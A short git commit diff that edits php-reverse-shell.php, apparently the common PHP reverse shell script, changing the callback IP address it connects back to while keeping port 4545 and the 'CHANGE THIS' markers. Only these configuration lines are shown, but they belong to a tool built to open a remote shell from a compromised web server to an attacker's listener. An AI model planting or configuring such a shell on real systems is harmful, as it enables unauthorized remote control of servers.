2aef435be29ff50d02cb63eb92fdde6021ba85cb
Bhisma Raj Timsina <89329040+bhismarajtimsina@users.noreply.github.com>
2023-12-31 11:23:30 +0545

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.2.47';  // CHANGE THIS
+$ip = '10.1.5.98';  // CHANGE THIS
 $port = 4545;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
